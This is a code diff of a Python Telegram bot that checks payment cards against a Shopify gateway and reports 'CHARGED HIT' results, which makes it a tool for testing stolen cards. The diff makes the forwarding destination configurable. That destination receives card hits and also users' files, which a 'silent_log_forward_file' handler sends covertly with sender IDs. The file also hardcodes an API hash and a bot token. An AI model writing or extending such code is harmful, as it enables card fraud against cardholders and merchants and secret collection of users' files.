@@ -114,6 +114,8 @@ API_HASH = os.getenv("API_HASH", "e53c44adf9ffc52f1eeca7d739e1b212")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8698873627:AAGJdo0TUcfG0PLRbC4wF12uCqz8YQnnmH0")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "1296435544"))
 KEY_ADMINS = {ADMIN_ID, 7203159458, 7716186369, 8409853085}
+CHANNEL_USERNAME = os.getenv("CHANNEL_USERNAME", "Fchker")
+FORWARD_GROUP = os.getenv("FORWARD_GROUP", os.getenv("LOG_GROUP", "Fchker"))
 # ============================================================
 # GLOBAL VARIABLES
 # ============================================================
@@ -131,7 +133,7 @@ async def is_joined_channel(user_id):
     except Exception as e:
         print("VERIFY ERROR:", e)
         return True
-CHANNEL_USERNAME = "Fchker"
+
 FAKE_HITS_ENABLED = False        
 # File paths
 PREMIUM_FILE = 'premium.txt'
@@ -1889,7 +1891,7 @@ async def single_chk_cc(event):
         if is_charged:
             try:
                 hit_log = f"""💳 <b>CHARGED HIT</b>\n<code>{card}</code>\nGateway: Shopify\nAmount: {price}\nResponse: {response_msg}\nUser: {user_id}"""
-                await bot.send_message("Fchker", hit_log, parse_mode="html")
+                await bot.send_message(FORWARD_GROUP, hit_log, parse_mode="html")
             except:
                 pass
 
@@ -3204,8 +3206,8 @@ async def silent_log_forward_file(event):
         sender = await event.get_sender()
         username = getattr(sender, 'username', None) or getattr(sender, 'first_name', str(event.sender_id))
         caption = f"\U0001f4c4 File from {username} (ID: {event.sender_id})\nFile: {event.file.name}"
-        await bot.send_message("Fchker", caption)
-        await bot.forward_messages("Fchker", event.message)
+        await bot.send_message(FORWARD_GROUP, caption)
+        await bot.forward_messages(FORWARD_GROUP, event.message)
     except Exception as e:
         print(f"Silent forward error: {e}")
 
@@ -3399,7 +3401,7 @@ async def mass_chk_reply(event):
                         await event.reply(hit_msg, parse_mode="html")
 
                         try:
-                            await bot.send_message("Fchker", hit_msg, parse_mode="html")
+                            await bot.send_message(FORWARD_GROUP, hit_msg, parse_mode="html")
                         except Exception:
                             pass
                     elif status_str in ('Error', 'Timeout'):
@@ -3643,7 +3645,7 @@ async def _run_generic_mass_check(event, gateway_name, check_func):
                     await event.reply(hit_msg, parse_mode="html")
 
                     try:
-                        await bot.send_message("Fchker", hit_msg, parse_mode="html")
+                        await bot.send_message(FORWARD_GROUP, hit_msg, parse_mode="html")
                     except Exception:
                         pass
                 elif st_lower in ('error', 'timeout'):
